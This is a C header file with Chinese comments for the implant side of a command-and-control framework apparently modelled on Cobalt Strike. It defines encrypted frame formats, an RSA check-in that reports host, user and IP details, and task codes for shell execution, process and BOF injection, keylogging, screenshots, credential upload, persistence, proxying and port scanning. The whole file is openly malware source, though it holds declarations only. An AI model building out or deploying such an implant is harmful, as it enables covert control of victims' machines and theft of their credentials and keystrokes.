/*
 * csdev :: frame.h  --  协议 v2 帧与 TLV (植入体侧)
 * ==========================================================================
 * 严格实现 docs/protocol_v2.md 第 2、3、4 节。
 *
 * 帧布局:
 *   [20B 帧头][body]
 *   body(普通) = [16B IV][AES-256-CBC 密文][32B HMAC-SHA256]
 *   body(checkin) = [256B RSA-2048/PKCS1v15 密文]
 *
 * HMAC 覆盖 = 帧头 20 字节 || IV || 密文
 * ==========================================================================
 */
#ifndef CSDEV_FRAME_H
#define CSDEV_FRAME_H

#include "../crypto/crypto.h"

#define CS_PROTO_MAGIC  0x4353324BUL   /* "CS2K" */
#define CS_FRAME_HDR    20
#define CS_MAX_FRAME    (4u * 1024u * 1024u)   /* 单帧上限 4 MB */

/* flags 位 */
#define F_CHECKIN    0x01u
#define F_HASRESULT  0x02u
#define F_CHUNKED    0x04u
#define F_ERROR      0x08u
#define F_NOHMAC     0x10u

/* TLV 类型 —— 上行 */
#define T_HEARTBEAT   0x1001
#define T_RESULT      0x1002
#define T_FILE_CHUNK  0x1003
#define T_PROXY_DATA  0x1004
#define T_KEYLOG      0x1005
#define T_SCREEN      0x1006
#define T_META_UPDATE 0x1007
#define T_CREDENTIAL  0x1008

/* TLV 类型 —— 下行 */
#define T_TASK        0x2001
#define T_CHUNK_ACK   0x2002
#define T_PROXY_DOWN  0x2003
#define T_SET_SLEEP   0x2004
#define T_KILL        0x2005

/* 任务子结构 */
#define T_INJ_PID     0x3001
#define T_INJ_METHOD  0x3002
#define T_INJ_PAYLOAD 0x3003
#define T_INJ_ARGS    0x3004
#define T_BOF_COFF    0x3005
#define T_BOF_ARGS    0x3006
#define T_BOF_ENTRY   0x3007
#define T_ASM_BYTES   0x3008
#define T_ASM_ARGS    0x3009

/* 命令类别 (TASK.Class) */
#define CMD_EXEC_SHELL   0x01
#define CMD_FILE_DL      0x02
#define CMD_FILE_UP      0x03
#define CMD_PROC_LIST    0x04
#define CMD_EXIT         0x05
#define CMD_SET_SLEEP    0x06
#define CMD_INJ_PROC     0x07
#define CMD_INJ_BOF      0x08
#define CMD_INJ_ASSEMBLY 0x09
#define CMD_TOKEN        0x0A
#define CMD_PROXY        0x0B
#define CMD_KEYLOG       0x0C
#define CMD_SCREENSHOT   0x0D
#define CMD_PERSIST      0x0E
#define CMD_PS_LIST      0x0F
#define CMD_FS_OPS       0x10
#define CMD_NET_OPS      0x11
#define CMD_PORTSCAN     0x12
#define CMD_RPORTFWD     0x13
#define CMD_CUSTOM       0x7F

/* 结果状态 */
#define ST_OK      0
#define ST_ERR     1
#define ST_PARTIAL 2
#define ST_BUSY    3

/* -------------------------------------------------------------- 会话状态 */

typedef struct {
    unsigned char aes_key[32];
    unsigned char hmac_key[32];
    unsigned int  session_id;
    unsigned int  tx_seq;        /* 上行序号 */
    unsigned int  rx_seq;        /* 期望的下行序号 */
    unsigned int  sleep_ms;
    unsigned char jitter;
} cs_session;

/* --------------------------------------------------------------- TLV */

typedef struct {
    unsigned short       type;
    unsigned short       len;
    const unsigned char *data;
} cs_tlv;

/* 写一个 TLV 到 out, 返回写入总字节数; 容量不足返回 0 */
unsigned int cs_tlv_write(unsigned char *out, unsigned int cap,
                          unsigned short type, const unsigned char *data,
                          unsigned int len);

/* 顺序解析下一个 TLV; 返回 1 成功并推进 *off, 0 表示结束或畸形 */
int cs_tlv_next(const unsigned char *buf, unsigned int buflen,
                unsigned int *off, cs_tlv *out);

/* 在 TLV 流中查找指定 type; 找到返回 1 */
int cs_tlv_find(const unsigned char *buf, unsigned int buflen,
                unsigned short type, const unsigned char **data,
                unsigned int *len);

/* --------------------------------------------------------------- 帧 */

/* 组装上行帧 (普通)。
 * out 容量需 >= 20 + 16 + ((plen/16)+1)*16 + 32。
 * 成功返回帧总长, 失败返回 0。seq 自增。 */
unsigned int cs_frame_seal(cs_session *s, unsigned int flags,
                           const unsigned char *plain, unsigned int plen,
                           unsigned char *out, unsigned int outcap);

/* 组装 checkin 帧。
 * meta 为 "host\x1Fuser\x1Farch\x1Fpid\x1Fppid\x1Fproc\x1Fip\x1Fos"。
 * pubkey_blob 为 PUBLICKEYBLOB。成功返回帧总长。 */
unsigned int cs_frame_checkin(unsigned char *out, unsigned int outcap,
                              const unsigned char *pubkey_blob, unsigned int pubkey_len,
                              const unsigned char *aes_key, const unsigned char *hmac_key,
                              const char *meta, unsigned int meta_len);

/* 打开下行帧: 解析帧头 -> 验 HMAC -> 解密。
 * 明文写入 plainbuf。成功返回明文长度 (>=0), 失败返回 -1。
 * 空应答 (F_NOHMAC 且 body 为 0) 返回 0。 */
int cs_frame_open(cs_session *s, const unsigned char *raw, unsigned int rawlen,
                  unsigned char *plainbuf, unsigned int plaincap);

/* --------------------------------------------------------------- 任务 */

typedef struct {
    unsigned int         id;
    unsigned char        cls;
    char                 alias[32];
    const unsigned char *arg;
    unsigned int         arglen;
} cs_task;

/* 从 TASK_BATCH 明文中取出第 idx 个任务; 返回 1 成功。
 * batch 格式: [4B count] count × [4B task_len][task] */
int cs_batch_task(const unsigned char *batch, unsigned int batchlen,
                  unsigned int idx, cs_task *out);
unsigned int cs_batch_count(const unsigned char *batch, unsigned int batchlen);

/* 组装 RESULT: [4B task_id][1B status][4B out_len][out] */
unsigned int cs_result_encode(unsigned char *out, unsigned int outcap,
                              unsigned int task_id, unsigned char status,
                              const unsigned char *data, unsigned int datalen);

/* --------------------------------------------------------------- 工具 */

unsigned int cs_be32(const unsigned char *p);
void         cs_put_be32(unsigned char *p, unsigned int v);
unsigned short cs_be16(const unsigned char *p);
void         cs_put_be16(unsigned char *p, unsigned short v);

#endif /* CSDEV_FRAME_H */
